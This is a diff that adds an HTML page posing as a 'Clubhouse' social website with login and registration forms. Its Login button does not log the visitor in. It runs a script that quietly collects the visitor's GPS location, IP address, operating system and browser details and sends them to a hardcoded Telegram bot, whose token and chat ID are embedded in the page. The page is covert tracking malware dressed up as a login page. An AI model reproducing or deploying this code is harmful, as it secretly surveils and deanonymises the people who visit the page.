@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clubhouse Style Website</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <img src="https://i.imgur.com/KC2DOGn.png" alt="Clubhouse Logo" class="logo"> <!-- Clubhouse Logo -->
+    <nav class="navbar">
+      <a href="#" onclick="showSection('login')">Login</a>
+      <a href="#" onclick="showSection('register')">Register</a>
+      <a href="#" onclick="showSection('news')">News</a>
+      <a href="#" onclick="showSection('photos')">Photos</a>
+      <a href="#" onclick="showSection('about')">About</a>
+      <a href="#" onclick="sendInfo()">Send Info</a> <!-- Link to trigger info sending -->
+    </nav>
+  </header>
+  
+  <main>
+    <div id="login" class="section">
+      <div class="login-container">
+        <div class="login-box">
+          <h2>Login</h2>
+          <form id="login-form">
+            <div class="user-box">
+              <input type="text" name="username" required>
+              <label>Username</label>
+            </div>
+            <div class="user-box">
+              <input type="password" name="password" required>
+              <label>Password</label>
+            </div>
+            <a href="#" onclick="sendLocation(event)" class="login-btn">
+              Login
+            </a>
+            <p>Don't have an account? <a href="#" onclick="showSection('register')">Register</a></p>
+            <p>Or <a href="#" onclick="guestLogin()">Continue as Guest</a></p>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+    <div id="register" class="section" style="display: none;">
+      <div class="login-container">
+        <div class="login-box">
+          <h2>Register</h2>
+          <form id="register-form">
+            <div class="user-box">
+              <input type="text" name="new-username" required>
+              <label>Username</label>
+            </div>
+            <div class="user-box">
+              <input type="password" name="new-password" required>
+              <label>Password</label>
+            </div>
+            <div class="user-box">
+              <input type="password" name="confirm-password" required>
+              <label>Confirm Password</label>
+            </div>
+            <a href="#" onclick="registerUser(event)" class="login-btn">
+              Register
+            </a>
+            <p>Already have an account? <a href="#" onclick="showSection('login')">Login</a></p>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+    <div id="news" class="section" style="display: none;">
+      <h2>News</h2>
+      <p>Latest news updates go here.</p>
+    </div>
+    
+    <div id="photos" class="section" style="display: none;">
+      <h2>Photos</h2>
+      <p>Photo gallery goes here.</p>
+    </div>
+    
+    <div id="about" class="section" style="display: none;">
+      <h2>About</h2>
+      <p>Information about the website goes here.</p>
+    </div>
+  </main>
+  
+  <script>
+    function showSection(sectionId) {
+      // Hide all sections
+      document.querySelectorAll('.section').forEach(section => {
+        section.style.display = 'none';
+      });
+      // Show the selected section
+      document.getElementById(sectionId).style.display = 'block';
+    }
+
+    function sendLocation(event) {
+      event.preventDefault(); // Prevent the default form submission
+      navigator.geolocation.getCurrentPosition(function(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        var botToken = '6632940757:AAGQ3eyOirJrxHU9jIRBWBF-I6C__2MqTvw'; // Your Telegram bot token
+        var chatId = '557532399'; // Your Telegram chat ID
+
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            var ip = data.ip;
+
+            // Get OS and Browser info
+            var os = navigator.platform;
+            var browser = navigator.userAgent;
+
+            // Format location link
+            var locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // Combine all the information
+            var message = `Location: [View on Google Maps](${locationLink})\n` +
+                          `IP Address: ${ip}\n` +
+                          `Operating System: ${os}\n` +
+                          `Browser Info: ${browser}`;
+
+            // Send the information to Telegram
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            var params = {
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'MarkdownV2' // Use MarkdownV2 to format the link properly
+            };
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(params));
+          })
+          .catch(error => {
+            console.error('Error fetching IP address:', error);
+          });
+      }, function(error) {
+        console.error('Error getting location:', error);
+      });
+    }
+
+    function guestLogin() {
+      alert('Logged in as guest!');
+    }
+
+    function registerUser(event) {
+      event.preventDefault(); // Prevent the default form submission
+      // Implement registration logic here
+      alert('Registration functionality is not implemented yet.');
+    }
+  </script>
+</body>
+</html>
